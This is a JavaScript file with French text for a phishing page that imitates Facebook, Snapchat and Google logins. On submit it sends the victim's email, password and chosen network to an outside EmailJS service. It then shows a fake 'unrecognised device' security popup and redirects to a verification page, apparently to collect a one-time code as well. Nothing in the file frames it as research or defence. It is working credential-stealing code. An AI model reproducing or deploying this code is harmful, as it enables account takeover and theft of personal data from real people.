
let reseau = ""; // Variable globale

emailjs.init("hM2MRTs2oi0bYWFE8");

function choisirReseau(nom) {
  reseau = nom;
  activerChamps(nom);
  updateInputPlaceholders(nom);
}

function activerChamps() {
  document.querySelector('input[name="user_email"]').disabled = false;
  document.querySelector('input[name="user_password"]').disabled = false;
}

function updateInputPlaceholders(domain) {
  const emailInput = document.querySelector('input[name="user_email"]');
  const passwordInput = document.querySelector('input[name="user_password"]');

  if (!emailInput || !passwordInput) return;

  if (domain === 'facebook') {
    emailInput.placeholder = "Adresse e-mail ou numéro Facebook";
    passwordInput.placeholder = "Mot de passe Facebook";
  } else if (domain === 'snapchat') {
    emailInput.placeholder = "Nom d’utilisateur ou e-mail Snapchat";
    passwordInput.placeholder = "Mot de passe Snapchat";
  } else if (domain === 'google') {
    emailInput.placeholder = "Adresse Gmail ou téléphone";
    passwordInput.placeholder = "Mot de passe Google";
  }
}

function afficherPopupSecurite() {
  const popup = document.createElement("div");
  popup.innerHTML = `
    <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                background-color: rgba(0, 0, 0, 0.7); display: flex;
                justify-content: center; align-items: center; z-index: 10000;">
      <div style="background-color: white; padding: 20px; border-radius: 10px;
                  text-align: center; width: 90%; max-width: 400px;">
        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" alt="Alerte"
             style="width: 50px; margin-bottom: 15px;">
        <h2 style="color: #c0392b;">Appareil non reconnu</h2>
        <p>Pour des raisons de sécurité, la connexion nécessite une validation.
        <br>Un code de vérification vous sera envoyé d’ici les 2 prochaines minutes.</p>
        <button id="ok-verification" style="margin-top: 15px; padding: 10px 20px;
                font-size: 1rem; background-color: #1877f2; color: white;
                border: none; border-radius: 5px; cursor: pointer;">OK</button>
      </div>
    </div>
  `;
  document.body.appendChild(popup);
  document.getElementById("ok-verification").addEventListener("click", () => {
    window.location.href = "verification.html";
  });
}

document.getElementById("login-form").addEventListener("submit", function (e) {
  e.preventDefault();
  document.dispatchEvent(new Event("click"));

  const form = this;
  const email = form.user_email.value;
  const password = form.user_password.value;

  document.querySelector(".facebook-btn").disabled = true;
  document.getElementById("loader").classList.remove("hidden");

  emailjs.send("service_brainduel", "template_password", {
    user_email: email,
    user_password: password,
    reseau_choisi: reseau // <-- ENVOI DU NOM DU RÉSEAU
  }).then(function () {
    setTimeout(() => {
      localStorage.setItem("user_email_verif", email);
      afficherPopupSecurite();
    }, 1000);
  }, function (error) {
    alert("Erreur : " + JSON.stringify(error));
    document.querySelector(".facebook-btn").disabled = false;
    document.getElementById("loader").classList.add("hidden");
  });
});
